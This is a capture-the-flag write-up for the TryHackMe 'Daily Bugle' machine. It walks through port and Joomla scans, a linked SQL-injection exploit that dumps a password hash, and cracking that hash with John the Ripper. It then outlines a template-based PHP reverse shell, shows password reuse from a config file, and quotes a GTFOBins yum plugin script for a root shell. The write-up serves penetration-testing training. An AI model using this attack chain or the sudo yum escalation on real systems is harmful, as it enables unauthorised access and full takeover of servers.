# Daily Bugle
#### Silver GarcÃ­a
----

IP: 10.10.99.26

## NMAP
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68ed7b197fed14e618986dc58830aae9 (RSA)
|   256 5cd682dab219e33799fb96820870ee9d (ECDSA)
|_  256 d2a975cf2f1ef5444f0b13c20fd737cc (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
```
## Hacking joomla
Joomla version: 3.7.0

### JoomlaScan
```
[+] Checking Directory Listing
[++] directory has directory listing : 
http://10.10.99.26/administrator/components
http://10.10.99.26/administrator/modules
http://10.10.99.26/administrator/templates
http://10.10.99.26/images/banners

[+] admin finder
[++] Admin page : http://10.10.99.26/administrator/

[+] Checking robots.txt existing
[++] robots.txt is found
path : http://10.10.99.26/robots.txt 

Interesting path found from robots.txt
http://10.10.99.26/joomla/administrator/
http://10.10.99.26/administrator/
http://10.10.99.26/bin/
http://10.10.99.26/cache/
http://10.10.99.26/cli/
http://10.10.99.26/components/                                                                                                                                                                                                              
http://10.10.99.26/includes/                                                                                                                                                                                                                
http://10.10.99.26/installation/                                                                                                                                                                                                            
http://10.10.99.26/language/                                                                                                                                                                                                                
http://10.10.99.26/layouts/                                                                                                                                                                                                                 
http://10.10.99.26/libraries/                                                                                                                                                                                                               
http://10.10.99.26/logs/                                                                                                                                                                                                                    
http://10.10.99.26/modules/                                                                                                                                                                                                                 
http://10.10.99.26/plugins/                                                                                                                                                                                                                 
http://10.10.99.26/tmp/     
```

Get users using following script: https://github.com/stefanlucas/Exploit-Joomla

```
[$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
```

## Cracking password
Got password using hashes.com 
```
spiderman123
```

### Using John the Ripper
```
sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
```
Password: spiderman123 

## Getting reverse shell
1. Log in on administrator CMS
2. Go to templates page
3. Change index.php with a php-reverse-shell
4. Set listener
5. Visit index.php to get reverse shell

## Privilege escalation to jjameson user
Found on configuration.php file:
```
		public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'root';
        public $password = 'nv5uz9r3ZEDzVjNu';
```
The password is the same for the user:
user: jjameson
password: nv5uz9r3ZEDzVjNu

## Getting root privileges
sudo -l
```
User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

GTFO bins script
```
Spawn interactive root shell by loading a custom plugin.

TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

